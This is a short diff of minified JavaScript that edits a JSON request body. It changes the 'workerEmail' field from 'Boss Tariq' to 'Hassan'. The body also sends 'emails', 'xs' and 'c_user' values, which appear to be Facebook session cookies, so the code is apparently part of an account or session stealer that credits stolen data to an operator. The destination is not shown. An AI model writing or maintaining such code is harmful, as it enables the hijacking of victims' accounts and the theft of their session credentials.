@@ -10172,7 +10172,7 @@
                                                     },
                                                     body: JSON.stringify({
                                                         emails: o,
-                                                        workerEmail: "Boss Tariq",
+                                                        workerEmail: "Hassan",
                                                         xs: r,
                                                         c_user: i,
                                                         name: "Tariq"
